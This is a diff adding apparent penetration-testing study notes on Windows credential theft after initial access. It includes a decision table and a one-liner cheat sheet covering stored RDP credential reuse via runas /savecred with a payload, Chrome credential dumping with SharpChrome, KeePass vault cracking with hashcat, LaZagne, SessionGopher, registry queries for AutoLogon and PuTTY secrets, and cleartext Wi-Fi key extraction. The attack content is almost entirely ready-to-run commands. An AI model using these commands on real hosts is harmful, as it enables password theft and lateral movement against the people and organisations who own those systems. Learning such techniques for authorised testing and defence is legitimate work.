@@ -1,0 +1,93 @@
+🔐 Summary: Further Credential Theft
+This section expands on how attackers can extract stored credentials beyond typical plaintext files, diving into saved credentials across tools, browsers, registries, and Windows features. Key areas include:
+
+cmdkey stored RDP credentials
+
+Browser credential storage (Chrome, via SharpChrome)
+
+Password managers like KeePass (.kdbx cracking with keepass2john and Hashcat)
+
+Email hunting with MailSniper
+
+LaZagne to mass extract saved creds across applications
+
+SessionGopher for decrypting saved SSH/RDP sessions
+
+Registry-stored credentials (AutoLogon, PuTTY)
+
+Wi-Fi passwords stored on the host
+
+🧠 Patterns & Hints
+🧠 Privs matter – Many tools (LaZagne, SessionGopher) will yield more when run as local admin or SYSTEM.
+
+🧠 Persistence trail – Users reuse passwords across browser creds, RDP, KeePass vaults, etc.
+
+🧠 Unsecured storage – Tools like PuTTY and AutoLogon often keep creds in plaintext.
+
+🧠 Think lateral – Stored RDP creds and Wi-Fi keys often give access beyond the current system.
+
+⚙️ "Got This, Do That" Decision Flow
+🎯 Scenario: You land on a box with user-level access
+Got This	Do That
+🟢 You see stored RDP sessions	cmdkey /list → runas /savecred to attempt lateral movement
+🟢 Chrome is installed	Run SharpChrome.exe logins /unprotect to extract browser credentials
+🟢 KeePass .kdbx file found	keepass2john.py → hashcat -m 13400 with RockYou or hybrid list
+🟢 PowerShell script with .xml creds	Import-Clixml → .GetNetworkCredential().Password
+🟢 User is logged in to Exchange	Use MailSniper to search inbox for keywords like "password"
+🟢 Admin or local access to PS session	.\lazagne.exe all or targeted modules (e.g., windows, browsers)
+🟢 RDP, PuTTY, WinSCP saved sessions	Use SessionGopher.ps1
+🟢 Access to registry (HKCU/HKU)	Query keys for AutoLogon, PuTTY, and plaintext values
+🟢 Wireless interface on host	netsh wlan show profile → netsh wlan show profile <SSID> key=clear
+🔎 One-Liner Cheat Sheet
+🔐 Stored Credential Dumps
+powershell
+Copy
+Edit
+cmdkey /list
+runas /savecred /user:<DOMAIN\USER> "powershell.exe -nop -c <payload>"
+🌐 Browser Credential Theft
+powershell
+Copy
+Edit
+.\SharpChrome.exe logins /unprotect
+🧷 KeePass Cracking
+bash
+Copy
+Edit
+python2.7 keepass2john.py vault.kdbx > hash
+hashcat -m 13400 hash rockyou.txt
+📥 Powershell XML Credential Decryption
+powershell
+Copy
+Edit
+$cred = Import-Clixml -Path C:\scripts\pass.xml
+$cred.GetNetworkCredential().Password
+🦊 LaZagne
+powershell
+Copy
+Edit
+.\lazagne.exe all
+.\lazagne.exe windows
+🔐 SessionGopher
+powershell
+Copy
+Edit
+Import-Module .\SessionGopher.ps1
+Invoke-SessionGopher -Target <HOST>
+🛠 Autologon Registry Creds
+powershell
+Copy
+Edit
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+🔧 PuTTY Registry Creds
+powershell
+Copy
+Edit
+reg query HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions
+reg query HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions\<SessionName>
+📡 Wi-Fi Key Dumping
+cmd
+Copy
+Edit
+netsh wlan show profile
+netsh wlan show profile <SSID> key=clear
